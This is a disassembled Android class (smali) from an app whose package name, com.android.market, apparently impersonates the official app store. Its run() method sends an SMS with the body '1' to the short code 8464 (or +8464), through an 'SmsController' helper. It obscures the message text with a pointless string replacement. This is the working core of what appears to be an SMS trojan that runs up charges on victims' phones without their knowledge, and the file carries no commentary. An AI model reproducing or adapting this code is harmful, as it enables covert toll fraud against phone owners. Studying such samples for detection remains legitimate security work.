.class Lcom/android/market/s;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field a:Ljava/lang/String;

.field final synthetic b:Lcom/android/market/SmsController;

.field private final synthetic c:I

.field private final synthetic d:Landroid/content/Context;

.field private final synthetic e:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/android/market/SmsController;ILandroid/content/Context;Landroid/os/Handler;)V
    .locals 1

    iput-object p1, p0, Lcom/android/market/s;->b:Lcom/android/market/SmsController;

    iput p2, p0, Lcom/android/market/s;->c:I

    iput-object p3, p0, Lcom/android/market/s;->d:Landroid/content/Context;

    iput-object p4, p0, Lcom/android/market/s;->e:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, ""

    iput-object v0, p0, Lcom/android/market/s;->a:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    iget v0, p0, Lcom/android/market/s;->c:I

    const/16 v1, 0x11

    if-lt v0, v1, :cond_0

    const-string v0, "+8464"

    iput-object v0, p0, Lcom/android/market/s;->a:Ljava/lang/String;

    :goto_0
    iget-object v0, p0, Lcom/android/market/s;->d:Landroid/content/Context;

    iget-object v1, p0, Lcom/android/market/s;->a:Ljava/lang/String;

    const-string v2, "abcdef"

    const-string v3, "abcdef"

    const-string v4, "1"

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/android/market/SmsController;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/android/market/s;->e:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    return-void

    :cond_0
    const-string v0, "8464"

    iput-object v0, p0, Lcom/android/market/s;->a:Ljava/lang/String;

    goto :goto_0
.end method
